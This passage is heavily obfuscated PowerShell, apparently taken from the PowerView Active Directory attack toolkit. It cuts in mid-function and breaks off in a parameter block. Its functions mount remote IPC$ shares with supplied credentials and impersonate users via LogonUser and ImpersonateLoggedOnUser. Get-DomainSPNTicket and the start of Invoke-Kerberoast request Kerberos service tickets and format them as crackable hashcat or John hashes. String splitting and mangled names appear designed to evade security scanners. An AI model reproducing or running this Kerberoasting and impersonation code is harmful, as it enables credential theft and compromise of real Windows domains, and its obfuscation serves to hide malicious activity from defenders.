                ${convErTed`i`d`enti`TY} = ${i`de`NTiTY} | &("{0}{3}{2}{1}" -f'Co','DName','A','nvert-') -OutputType ("{0}{2}{1}"-f'C','al','anonic')
                if (${cOnV`Er`TeDId`e`NtiTy}) {
                    ${con`N`e`cTT`ARGEt} = ${CoNVeRT`EDID`e`NtITy}.("{3}{1}{0}{2}" -f 'r','bSt','ing','Su').Invoke(0, ${coNV`erT`EDi`DenTity}.("{1}{2}{0}" -f 'f','I','ndexO').Invoke('/'))
                    ${O`BjeCti`D`E`NtiTY} = ${I`dE`Ntity}.("{1}{0}" -f'lit','Sp').Invoke('\')[1]
                    &("{0}{3}{1}{4}{2}" -f'W','ite-V','e','r','erbos') ('[Get-P'+'rinc'+'ip'+'alCo'+'nt'+'ext] '+'Bi'+'nding '+'t'+'o '+'doma'+'in '+"'$ConnectTarget'")
                }
            }
            else {
                ${oBjec`TID`en`TI`Ty} = ${IDE`NTiTy}
                &("{0}{1}{2}{3}"-f 'Wr','ite-','Ve','rbose') ('[Get-'+'P'+'ri'+'ncipalCont'+'ext] '+'B'+'ind'+'ing '+'t'+'o '+'d'+'om'+'ain '+"'$Domain'")
                ${cONneC`T`Targ`ET} = ${d`oMain}
            }

            if (${PSbOuND`pa`RA`met`ers}[("{2}{0}{1}"-f 'nti','al','Crede')]) {
                &("{0}{1}{3}{2}" -f'Wr','ite-','bose','Ver') ("{6}{4}{0}{8}{2}{1}{5}{3}{7}"-f 'n','alter','t] Using ','denti','t-Pri','nate cre','[Ge','als','cipalContex')
                ${con`TE`XT} = &("{2}{1}{0}"-f 'ct','-Obje','New') -TypeName ("{11}{3}{2}{9}{6}{12}{13}{8}{7}{10}{4}{5}{0}{16}{1}{14}{15}{17}"-f't.Pri','cipal','.','ystem','age','men','er','a','ntM','DirectoryS','n','S','vices.A','ccou','Co','nt','n','ext') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"D`OmA`In", ${C`O`N`N`EcTtaRgEt}, ${cR`EdE`N`TIAl}."us`ERNAME", ${c`R`Edent`iAl}.("{4}{3}{1}{0}{2}"-f'e','d','ntial','kCre','GetNetwor').Invoke()."pa`ssw`OrD")
            }
            else {
                ${C`ONtE`xt} = &("{2}{1}{0}"-f'ect','-Obj','New') -TypeName ("{9}{6}{2}{8}{0}{4}{1}{3}{5}{7}"-f 'Acco','tManagement.','rySe','Principal','un','C','em.Directo','ontext','rvices.','Syst') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"DoMA`In", ${C`ONN`eC`Tta`RGET})
            }
        }
        else {
            if (${PsB`O`UN`DpA`RAMet`eRs}[("{1}{0}{3}{2}" -f'ed','Cr','al','enti')]) {
                &("{1}{0}{2}" -f'rite','W','-Verbose') ("{0}{4}{2}{9}{7}{5}{6}{12}{1}{8}{13}{3}{11}{14}{10}"-f'[Get-Pri','] ','c',' ','n','lCont','ex','pa','Us','i','tials','alternate cred','t','ing','en')
                ${dOmaI`NnA`Me} = &("{2}{1}{3}{0}" -f'in','o','Get-D','ma') | &("{2}{1}{0}" -f 'ect','ect-Obj','Sel') -ExpandProperty ("{0}{1}" -f'Nam','e')
                ${Con`TEXT} = &("{1}{0}{2}"-f 'Ob','New-','ject') -TypeName ("{11}{9}{16}{12}{5}{7}{4}{13}{10}{1}{14}{0}{15}{3}{8}{2}{6}{17}"-f'anagemen','vices.Account','c','.','rect','D','i','i','Prin','t','Ser','Sys','.','ory','M','t','em','palContext') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"DO`maIn", ${doMAiNN`A`Me}, ${crEdEN`T`Ial}."use`RNA`Me", ${c`RedEnTi`AL}.("{1}{0}{3}{4}{2}" -f 'etNe','G','ential','tworkCre','d').Invoke()."P`ASsWORD")
            }
            else {
                ${c`ONtE`xT} = &("{0}{2}{1}" -f'Ne','t','w-Objec') -TypeName ("{2}{0}{5}{7}{9}{4}{6}{1}{3}{8}"-f 'em.','rincipal','Syst','Cont','ntManag','Director','ement.P','yServices.Acc','ext','ou') -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::"DO`m`Ain")
            }
            ${Ob`JeCTID`Ent`iTY} = ${I`DE`NTity}
        }

        ${o`UT} = &("{0}{3}{1}{2}" -f'Ne','-','Object','w') ("{2}{0}{1}"-f'j','ect','PSOb')
        ${o`UT} | &("{0}{1}{2}" -f 'Add-','Me','mber') ("{0}{2}{1}{3}" -f'N','rt','oteprope','y') ("{0}{2}{1}"-f 'C','ext','ont') ${c`ON`Text}
        ${o`UT} | &("{2}{0}{1}" -f '-Membe','r','Add') ("{1}{3}{0}{2}" -f'er','Note','ty','prop') ("{2}{1}{0}"-f'y','ntit','Ide') ${oBJ`Ec`TIDEN`TI`TY}
        ${o`Ut}
    }
    catch {
        &("{0}{2}{3}{1}" -f 'Wr','arning','ite','-W') ('[Ge'+'t-'+'Princi'+'pa'+'l'+'Context] '+'Er'+'ror'+' '+'cr'+'eating'+' '+'bi'+'nding'+' '+'for'+' '+'objec'+'t '+"('$Identity') "+'con'+'t'+'ext '+': '+"$_")
    }
}


function ADD-`Rem`oT`ecOnn`Ect`iON {


    [CmdletBinding(defAulTpaRAMeTeRSETNAme = {"{2}{1}{0}"-f 'uterName','p','Com'})]
    Param(
        [Parameter(POsiTIoN = 0, MAndAtOry = ${Tr`UE}, pAraMEtERSEtNAme = "c`o`MpUTERn`AME", vaLuEfrOMPipeLiNe = ${tr`UE}, valuefrOMpiPeLInEbYProPErtyNamE = ${t`RUE})]
        [Alias({"{0}{1}{2}" -f 'H','ost','Name'}, {"{2}{3}{1}{0}"-f 'name','host','d','ns'}, {"{0}{1}"-f'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`MPu`T`E`RNamE},

        [Parameter(PosITIoN = 0, PARAmeteRseTnamE = "pa`TH", MandATORy = ${T`RUE})]
        [ValidatePattern({(("{3}{1}{2}{0}{5}{4}" -f'VfFVfFV.','FV','fF','f','FV.*','*fFVf'))-REpLAcE 'fFV',[ChAr]92})]
        [String[]]
        ${p`ATH},

        [Parameter(maNdatory = ${T`RuE})]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`ede`NTIAL}
    )

    BEGIN {
        ${N`ETRES`Ou`RcE`INSTa`NcE} =  ${B`N`Ox5t}::("{2}{0}{3}{1}" -f 'a','nstance','Cre','teI').Invoke(${ne`Tr`Eso`Urcew})
        ${n`ET`REso`U`RceINS`T`ANce}."dW`TYpE" = 1
    }

    PROCESS {
        ${p`AThS} = @()
        if (${PSbOU`N`D`paRaMEt`ers}[("{2}{0}{1}{3}"-f'er','Nam','Comput','e')]) {
            ForEach (${t`ARgET`COMputErna`mE} in ${Co`mpUTe`R`NAme}) {
                ${TAr`GeTCo`Mp`UT`eRN`A`me} = ${tARge`T`COMPUtE`RNaME}.("{1}{0}"-f 'im','Tr').Invoke('\')
                ${p`At`HS} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${paT`hS} += ,${pa`TH}
        }

        ForEach (${ta`Rget`PaTh} in ${p`AThs}) {
            ${NEtr`es`OU`R`C`EinsTAncE}."Lpremote`N`A`ME" = ${t`A`R`GetPath}
            &("{1}{3}{4}{2}{0}"-f 'ose','Writ','erb','e','-V') ('[Ad'+'d-Rem'+'o'+'teConnect'+'ion] '+'Attempt'+'in'+'g '+'t'+'o '+'mou'+'nt'+': '+"$TargetPath")

            
            
            ${R`EsU`Lt} = ${m`pr}::("{5}{3}{0}{2}{1}{4}" -f 'nne','on','cti','o','2W','WNetAddC').Invoke(${NETR`esoUr`ceInSt`Ance}, ${c`REDen`TiaL}.("{0}{1}{4}{2}{3}{5}"-f'G','etNetw','r','ede','orkC','ntial').Invoke()."PaS`swO`RD", ${cr`ED`EN`TIaL}."uS`E`RNAME", 4)

            if (${r`eSulT} -eq 0) {
                &("{2}{0}{1}"-f'bos','e','Write-Ver') ("$TargetPath "+'su'+'c'+'ces'+'sfully '+'moun'+'ted')
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function ReMO`Ve-r`em`otE`cONnE`Cti`On {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{6}{5}{9}{4}{3}{7}{8}{2}{10}"-f 'PSUseS','h','cti','ha','cessForStateC','ld','ou','ngingFu','n','Pro','ons'}, '')]
    [CmdletBinding(deFaulTPARaMetersetnAMe = {"{1}{2}{0}" -f 'e','Compute','rNam'})]
    Param(
        [Parameter(posITIon = 0, mANdaToRy = ${tR`Ue}, PaRAMetErseTNaMe = "c`oMpu`TE`RnaMe", VAlUEFROmpiPeLiNe = ${T`RUe}, VaLuEFrompipElInEByPROPertYnamE = ${t`Rue})]
        [Alias({"{0}{2}{1}" -f 'HostN','me','a'}, {"{1}{2}{0}" -f 'me','dns','hostna'}, {"{1}{0}"-f 'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`OMp`Ut`e`RnAmE},

        [Parameter(POsiTiOn = 0, paRAmETERSEtNamE = "P`ATH", ManDAToRy = ${tr`UE})]
        [ValidatePattern({(("{0}{1}{3}{2}"-f '6O','w6Ow','6Ow.*6Ow6Ow.*','6Ow'))."r`eplAce"(([char]54+[char]79+[char]119),[sTRINg][char]92)})]
        [String[]]
        ${p`ATh}
    )

    PROCESS {
        ${PA`THS} = @()
        if (${p`SBoUNDp`ArA`MetErs}[("{2}{0}{1}" -f'ut','erName','Comp')]) {
            ForEach (${T`ArGe`T`cOmPuTeRnamE} in ${CoMp`Ut`ern`AME}) {
                ${TA`Rg`eT`cOMput`eRN`AME} = ${t`ArgEt`COmp`U`TERnAME}.("{1}{0}" -f'im','Tr').Invoke('\')
                ${Pat`hs} += ,"\\$TargetComputerName\IPC$"
            }
        }
        else {
            ${Pat`Hs} += ,${pa`Th}
        }

        ForEach (${t`Ar`GETPaTH} in ${p`AtHS}) {
            &("{0}{3}{2}{1}"-f 'Wri','bose','r','te-Ve') ('[Remo'+'ve-Remo'+'t'+'eConn'+'ection] '+'Att'+'empti'+'ng '+'t'+'o '+'u'+'nmount: '+"$TargetPath")
            ${reSu`Lt} = ${m`PR}::("{1}{0}{4}{3}{2}" -f'c','WNetCan','nnection2','lCo','e').Invoke(${t`Arg`ETP`AtH}, 0, ${tr`UE})

            if (${ResU`LT} -eq 0) {
                &("{1}{2}{0}"-f 'se','Write-Ve','rbo') ("$TargetPath "+'s'+'u'+'c'+'cessfu'+'lly '+'u'+'mmoun'+'ted')
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $TargetPath : $(([ComponentModel.Win32Exception]$Result).Message) "
            }
        }
    }
}


function INV`o`Ke-uS`ERiMP`e`RsON`AT`ion {


    [OutputType([IntPtr])]
    [CmdletBinding(defauLTPaRAmeteRseTnaMe = {"{0}{3}{2}{1}"-f'C','ial','ent','red'})]
    Param(
        [Parameter(maNDatory = ${tr`Ue}, paRametErsETnAME = "cRE`D`EnTiAL")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CreDen`TI`Al},

        [Parameter(manDaToRy = ${t`RuE}, PaRametersETNAME = "tOKe`NH`AnD`Le")]
        [ValidateNotNull()]
        [IntPtr]
        ${tO`K`eNHAnd`le},

        [Switch]
        ${qui`eT}
    )

    if (( (  GEt-VaRiABlE  ("r"+"5ip")  )."VaL`Ue"::"cUrr`ENtTHrE`AD".("{1}{4}{2}{0}{5}{3}"-f 'a','Ge','Ap','e','t','rtmentStat').Invoke() -ne 'STA') -and (-not ${p`SbOU`NDpARaME`TE`RS}[("{1}{0}"-f 'uiet','Q')])) {
        &("{2}{1}{0}" -f'-Warning','ite','Wr') ("{8}{11}{12}{17}{27}{24}{20}{3}{7}{13}{15}{28}{6}{25}{4}{18}{16}{14}{21}{19}{9}{5}{1}{26}{10}{0}{22}{23}{29}{2}" -f 'oke','tate','rk.','i','i',' s','u','on] powe','[','ent','t','Inv','o','rsh','le-threa','ell.exe is not ','sing','ke','n a ','m','sonat','ded apart','n impersonation ma','y ','UserImper','rrently ',', ','-','c','not wo')
    }

    if (${Ps`BoUnDP`AraMe`TErS}[("{1}{0}{2}" -f'Hand','Token','le')]) {
        ${l`oGonT`Oke`NHAn`DLe} = ${TOK`eN`HA`Ndle}
    }
    else {
        ${Lo`gONt`OKE`Nh`AND`lE} =  ${zFV`W1}::"Ze`Ro"
        ${ne`TW`orkC`Re`D`EntiAl} = ${cREDEnt`I`AL}.("{3}{1}{2}{0}{4}"-f 'o','t','w','GetNe','rkCredential').Invoke()
        ${u`sErd`om`AIN} = ${nETwoRkC`R`Ede`NTIAL}."DO`M`AiN"
        ${u`S`er`NaMe} = ${nEtW`oRK`C`RedENTIAl}."uS`eRNAme"
        &("{2}{0}{3}{1}" -f'rite-W','ng','W','arni') "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        ${RES`Ult} = ${AdvA`Pi`32}::("{0}{2}{1}"-f 'Lo','ser','gonU').Invoke(${UsE`R`NA`ME}, ${USeRD`Om`Ain}, ${NEtW`or`kcRE`D`enTIaL}."Pas`s`WORD", 9, 3, [ref]${LOGontoK`En`h`And`le});${las`TErr`Or} =   (DIr  ("{3}{1}{2}{0}" -f 'Le:j76','aRIa','B','V') )."va`lue"::("{0}{2}{3}{1}{4}" -f'Get','in32Err','Las','tW','or').Invoke();

        if (-not ${RES`Ult}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    ${rEs`UlT} = ${ad`VaP`i32}::("{4}{5}{1}{0}{2}{3}{6}"-f'teLogg','ersona','edO','nUs','I','mp','er').Invoke(${LOG`O`NtoKENh`AnDLE})

    if (-not ${r`es`ULt}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{0}{3}{2}{1}" -f 'Write-Ve','ose','b','r') ("{3}{6}{11}{9}{1}{2}{7}{5}{10}{12}{0}{4}{8}" -f 'ly imper','Imper','sonation] Altern','[','sonat','ccessf','I','ate credentials su','ed','e-User','u','nvok','l')
    ${l`O`G`OnTOke`NhanD`Le}
}


function I`N`VOkE-reVerTtos`Elf {


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${tOke`Nhan`dle}
    )

    if (${PsboU`Ndpara`met`ErS}[("{1}{2}{3}{0}"-f'ndle','T','okenH','a')]) {
        &("{0}{2}{3}{1}" -f'Wr','Warning','ite','-') ("{4}{2}{10}{14}{6}{0}{5}{17}{9}{15}{21}{18}{7}{25}{16}{22}{24}{20}{12}{23}{8}{13}{19}{1}{11}{3}" -f 'Rever','nd','e-R','e','[Invok','t',' ','atio','r(',' token im','ev','l','ng ',') to','ertToSelf]','pe','and','ing','son','ken ha','osi','r',' ','LogonUse','cl','n ')
        ${reS`ULT} = ${k`ERnel`32}::("{1}{0}{2}"-f 'seHand','Clo','le').Invoke(${TOk`E`NHa`NDle})
    }

    ${RE`s`ULT} = ${advaP`I`32}::("{2}{1}{0}" -f 'oSelf','ertT','Rev').Invoke();${LasTe`R`R`oR} =   ( GEt-vARIabLe ("{1}{0}" -f '76','j'))."vA`LuE"::("{3}{1}{2}{0}"-f'or','tL','astWin32Err','Ge').Invoke();

    if (-not ${R`Esult}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{3}{1}{2}{0}{4}"-f'-Verbo','i','te','Wr','se') ("{3}{2}{9}{7}{1}{4}{5}{8}{6}{0}"-f 'd',' ','R','[Invoke-','imp','er','y reverte','tToSelf] Token','sonation successfull','ever')
}


function Get-DoMAinSPnt`i`ck`Et {


    [OutputType({"{4}{2}{1}{3}{0}" -f't','NT','View.SP','icke','Power'})]
    [CmdletBinding(DEfAUltparamETERSeTnAME = {"{1}{0}" -f 'awSPN','R'})]
    Param (
        [Parameter(PoSITIon = 0, pArAmeterSeTnAme = "RAws`PN", MANDAToRy = ${Tr`Ue}, VALuEfROMpipeliNe = ${Tr`UE})]
        [ValidatePattern({"{1}{0}"-f '*','.*/.'})]
        [Alias({"{0}{2}{3}{4}{5}{1}"-f'ServiceP','ame','ri','nci','pal','N'})]
        [String[]]
        ${S`pn},

        [Parameter(positiON = 0, PArameTeRSeTname = "uS`er", MaNdatOrY = ${t`RUE}, VaLuEFromPipeliNE = ${T`RUe})]
        [ValidateScript({ ${_}."PsOb`JE`CT"."t`ypen`Ames"[0] -eq ("{2}{4}{3}{0}{1}"-f 'Use','r','Pow','w.','erVie') })]
        [Object[]]
        ${Us`Er},

        [ValidateSet({"{1}{0}"-f'hn','Jo'}, {"{1}{0}"-f'at','Hashc'})]
        [Alias({"{2}{1}{0}" -f'at','m','For'})]
        [String]
        ${OuTPu`TfO`RMat} = ("{2}{0}{1}" -f'sh','cat','Ha'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEdEn`T`IAl} =  ( VaRiaBLe  ("{1}{0}" -f'02','7tq') -VALUEON  )::"emP`TY"
    )

    BEGIN {
        ${Nu`Ll} =   ( VariablE  ("{1}{0}"-f 'xEb','4') )."V`ALUe"::("{0}{1}{3}{4}{2}" -f 'Load','W','Name','ithP','artial').Invoke(("{3}{1}{5}{4}{0}{2}"-f 'Ident','y','ityModel','S','m.','ste'))

        if (${p`SBO`UNDp`ArAM`ete`Rs}[("{2}{0}{1}{3}"-f 'reden','tia','C','l')]) {
            ${l`OGoNTOk`EN} = &("{4}{3}{2}{0}{1}"-f'sonat','ion','erImper','nvoke-Us','I') -Credential ${c`RE`deN`TIAl}
        }
    }

    PROCESS {
        if (${PSbOU`N`DPARa`m`ETE`Rs}[("{1}{0}"-f 'er','Us')]) {
            ${T`A`RGEt`OBjECT} = ${US`ER}
        }
        else {
            ${TARg`ETo`B`Ject} = ${s`Pn}
        }

        ForEach (${o`BjE`cT} in ${TAr`ge`T`ObjEct}) {
            if (${ps`BOUnD`p`AR`AmeTERs}[("{1}{0}" -f 'r','Use')]) {
                ${uSer`S`pN} = ${o`BjE`CT}."s`ER`VicEpRinCIPa`L`NAmE"
                ${SA`M`ACcoUn`TnAme} = ${Obj`ECt}."sA`ma`CcoUn`T`NaMe"
                ${distINgUi`SH`ednA`me} = ${obj`ect}."disTiNg`Ui`SHedNa`me"
            }
            else {
                ${u`sERs`pn} = ${o`BjEct}
                ${sAma`cco`UnT`NaMe} = ("{0}{1}" -f'UNK','NOWN')
                ${dISt`inGUi`ShE`dna`ME} = ("{0}{1}{2}"-f 'U','N','KNOWN')
            }

            
            if (${USE`R`SpN} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${u`sERSPN} = ${US`E`RsPn}[0]
            }

            try {
                ${TICK`et} = &("{1}{2}{0}" -f't','New-Ob','jec') ("{8}{1}{9}{2}{5}{3}{0}{4}{6}{7}" -f'questorSecu','ystem.Ident','Model.Toke','erberosRe','ri','ns.K','ty','Token','S','ity') -ArgumentList ${USErs`Pn}
            }
            catch {
                &("{4}{2}{0}{3}{1}" -f'arn','g','te-W','in','Wri') ('['+'G'+'et-'+'Doma'+'inSPNTi'+'cke'+'t] '+'Erro'+'r '+'reques'+'ting'+' '+'ticket'+' '+'for'+' '+'S'+'PN '+"'$UserSPN' "+'fro'+'m '+'us'+'er '+"'$DistinguishedName' "+': '+"$_")
            }
            if (${Tic`k`Et}) {
                ${tI`Cket`B`ytEsTREam} = ${t`ICK`et}.("{1}{0}{2}{3}" -f 'qu','GetRe','e','st').Invoke()
            }
            if (${t`icKEtb`YTe`STRe`Am}) {
                ${O`Ut} = &("{2}{0}{1}" -f'-Objec','t','New') ("{1}{0}"-f 'ct','PSObje')

                ${T`ic`ke`THEXs`TReAM} =   (VARIabLe  ("{1}{2}{0}"-f'VZ','E2A','B')  -vALue)::("{1}{0}" -f'String','To').Invoke(${Ti`C`ket`BYTe`StreAM}) -replace '-'

                ${o`Ut} | &("{2}{1}{0}" -f'mber','-Me','Add') ("{2}{0}{1}" -f 'ropert','y','Notep') ("{1}{0}{3}{2}" -f 'amAc','S','Name','count') ${SAMACcO`UnT`NA`mE}
                ${O`Ut} | &("{2}{1}{3}{0}"-f 'mber','-','Add','Me') ("{1}{2}{0}"-f'y','No','tepropert') ("{0}{2}{1}{3}" -f 'Dis','is','tingu','hedName') ${d`iStin`Gui`ShED`NAME}
                ${o`UT} | &("{0}{1}{2}" -f 'Add-M','em','ber') ("{3}{0}{1}{2}" -f'epro','per','ty','Not') ("{2}{3}{0}{1}{4}" -f'Principal','Nam','Serv','ice','e') ${Ti`c`KET}."sE`R`Vi`cEPRIN`Cip`AlNA`mE"

                
                
                if(${tickeThexs`T`R`e`AM} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    ${E`TYpE} =  ( gET-CHIldITEM ("{1}{0}{2}" -f '5yXV6','VARIAbLE:','c')  )."vAL`UE"::("{1}{0}"-f'te','ToBy').Invoke( ${M`ATChES}."ETYp`eleN", 16 )
                    ${c`I`p`HErTEXtlen} =  (  GEt-VAriABlE  ("{0}{1}"-f '5Yx','V6C') )."Va`Lue"::("{2}{1}{0}" -f '2','3','ToUInt').Invoke(${m`AT`CHeS}."C`I`Ph`ERTE`XtlEn", 16)-4
                    ${CI`PhEr`TE`xT} = ${M`Atches}."d`AT`ATOEND".("{0}{2}{1}" -f 'Sub','ring','st').Invoke(0,${Cip`HeRTEx`Tl`eN}*2)

                    
                    if(${mAT`c`hES}."dat`AtOend".("{1}{0}"-f'bstring','Su').Invoke(${Ci`P`hEr`TExT`Len}*2, 4) -ne ("{1}{0}"-f'482','A')) {
                        &("{1}{2}{0}"-f'ng','Write-Warn','i') "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                        ${Ha`Sh} = ${n`ULL}
                        ${o`Ut} | &("{0}{2}{1}" -f'Ad','ber','d-Mem') ("{3}{1}{0}{2}" -f 'ropert','p','y','Note') ("{5}{3}{1}{2}{4}{0}"-f 'm','te','Hex','etBy','Strea','Tick') ( ${d`9X8}::("{2}{1}{0}"-f 'g','trin','ToS').Invoke(${T`iCKEtbYt`e`St`Ream}).("{1}{0}" -f 'ace','Repl').Invoke('-',''))
                    } else {
                        ${h`AsH} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        ${O`UT} | &("{0}{1}{2}" -f 'Add-Mem','be','r') ("{2}{0}{1}"-f'tepr','operty','No') ("{3}{1}{0}{2}" -f 'H','yte','exStream','TicketB') ${nu`lL}
                    }
                } else {
                    &("{1}{3}{0}{2}" -f 'ni','Write-Wa','ng','r') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    ${Ha`SH} = ${N`Ull}
                    ${O`Ut} | &("{1}{0}{2}"-f'Mem','Add-','ber') ("{1}{0}{2}{3}"-f'pe','Notepro','rt','y') ("{3}{2}{1}{0}{4}" -f 'tByteHexStr','ke','c','Ti','eam') (  ${D9`x8}::("{0}{1}" -f'ToS','tring').Invoke(${t`Ic`keT`BYTest`R`EAm}).("{1}{0}"-f 'ace','Repl').Invoke('-',''))
                }

                if(${Ha`sh}) {
                    
                    if (${OUT`p`U`TfORm`AT} -match ("{1}{0}" -f 'hn','Jo')) {
                        ${ha`Shf`o`RMaT} = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if (${dISTI`NgUI`s`heDnA`Me} -ne ("{0}{1}"-f'U','NKNOWN')) {
                            ${usE`R`doma`IN} = ${DISt`i`NguISh`EDnAMe}.("{2}{0}{1}" -f'tr','ing','SubS').Invoke(${Di`Sti`NGU`iS`HeDNAMe}.("{1}{0}" -f 'xOf','Inde').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            ${u`SE`RdOmain} = ("{0}{2}{1}"-f 'UN','WN','KNO')
                        }

                        
                        ${H`A`sHfOR`Mat} = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    ${O`Ut} | &("{1}{0}{2}"-f 'e','Add-Memb','r') ("{1}{0}{2}"-f'e','Not','property') ("{0}{1}"-f 'Has','h') ${h`AsHfor`MAt}
                }

                ${O`Ut}."psobj`E`CT"."tYP`E`Nam`eS".("{1}{0}"-f'nsert','I').Invoke(0, ("{0}{2}{1}{3}" -f 'Power','SPNTi','View.','cket'))
                ${o`Ut}
            }
        }
    }

    END {
        if (${lO`g`ONT`oKeN}) {
            &("{1}{4}{0}{3}{2}" -f'evertTo','Inv','f','Sel','oke-R') -TokenHandle ${lo`GonTO`k`en}
        }
    }
}


function I`NvoKe`-keRBE`ROAsT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}{4}" -f 'P','o','SSh','ouldPr','cess'}, '')]
    [OutputType({"{0}{2}{1}{3}{4}" -f'PowerVie','T','w.SPN','i','cket'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosiTiOn = 0, VaLuEFROMPipelINe = ${t`RUe}, valuEFrOMPiPElINebYpRoPErTYnAmE = ${t`Rue})]
        [Alias({"{0}{2}{3}{1}" -f'Di','ishedName','sti','ngu'}, {"{1}{2}{0}{3}"-f 'mAc','S','a','countName'}, {"{1}{0}" -f 'e','Nam'}, {"{4}{2}{6}{3}{0}{5}{1}" -f 'uishe','e','s','ng','MemberDi','dNam','ti'}, {"{3}{2}{1}{0}"-f 'e','am','rN','Membe'})]
        [String[]]
        ${IdE`NtITY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`omaiN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'er','Filt'})]
        [String]
        ${LD`Ap`FilTer},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'h','ADSPat'})]
        [String]
        ${sEa`Rch`B`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{1}{2}{0}"-f 'er','r','oll','DomainCont'})]
        [String]
        ${s`eR`VER},

        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{0}{1}{2}"-f 'On','eL','evel'}, {"{0}{1}"-f 'S','ubtree'})]
        [String]
        ${SeA`Rchsco`pE} = ("{1}{2}{0}" -f 'tree','S','ub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`s`UL`TPAGeSizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeR`Ve`RTIM`E`L`iMIT},

        [Switch]
        ${TO`mbst`oNe},

        [ValidateSet({"{1}{0}" -f 'n','Joh'}, {"{0}{1}{2}" -f'Hash','c','at'})]
        [Alias({"{1}{0}"-f't','Forma'})]
        [String]
        ${oUtPuTf`OrM`AT} = ("{1}{0}" -f 't','Hashca'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREd`En`T`IAl} =   ${7`TQ02}::"e`mPty"
    )

    BEGIN {
        ${usERSEa`R`CH`erArG`Um`EN`Ts} = @{
            'SPN' = ${tr`UE}
            ("{1}{2}{0}" -f'ties','Pro','per') = ("{4}{2}{11}{5}{12}{9}{6}{3}{7}{10}{13}{8}{0}{1}"-f 'am','e','amaccoun','n','s','e','inguished','ame,ser','n','dist','viceprincip','tnam',',','al')
        }
        if (${Psbo`U`NDPARamET`ers}[("{0}{2}{1}" -f 'D','ain','om')]) { ${u`SERSeaRCh`eR`A`Rgu`meNTS}[("{1}{0}{2}"-f'a','Dom','in')] = ${dom`A`iN} }
        if (${pSbOu`NDP`ARAmETe`Rs}[("{2}{1}{0}"-f 'ilter','PF','LDA')]) { ${uS`erSEaRC`HE`RaRgUmEN`TS}[("{2}{0}{1}" -f 'te','r','LDAPFil')] = ${Lda`pFI`L`Ter} }
        if (${psBo`Un`dparA`M`E`TErs}[("{2}{0}{1}" -f 'a','se','SearchB')]) { ${us`ers`E`Arc`Hera`RGumENTS}[("{1}{0}{2}" -f'rchBa','Sea','se')] = ${SEarCh`B`Ase} }
        if (${PsboUnDPa`RaM`ete`Rs}[("{1}{0}" -f'erver','S')]) { ${U`SEr`S`EA`RcHera`RGu`MEnTs}[("{1}{0}" -f'r','Serve')] = ${SEr`V`ER} }
        if (${Ps`B`oUNDpARAM`ETE`RS}[("{2}{1}{0}" -f'cope','rchS','Sea')]) { ${uSeRs`eaRcHE`RArgum`e`NTs}[("{1}{2}{3}{0}" -f 'pe','Searc','hS','co')] = ${seARChS`Co`pE} }
        if (${PSbo`Un`dpARAMet`ers}[("{2}{3}{0}{1}{4}" -f'g','eSiz','Re','sultPa','e')]) { ${usE`Rs`E`AR`CHEraRgUMenTs}[("{3}{0}{2}{1}"-f'su','tPageSize','l','Re')] = ${RESU`LTPag`e`size} }
        if (${PsbO`UNdpa`R`AME`TERS}[("{2}{0}{1}{3}"-f'erv','er','S','TimeLimit')]) { ${usersEArc`h`eRar`guM`ENTS}[("{3}{1}{2}{0}" -f 'imit','i','meL','ServerT')] = ${se`R`VerTIMEL`iMIt} }
        if (${pSB`OundPaRaM`Et`eRs}[("{0}{1}{2}" -f'T','o','mbstone')]) { ${U`sE`RSEARcherA`RGUmEN`Ts}[("{1}{2}{0}"-f'tone','Tom','bs')] = ${ToM`Bsto`NE} }
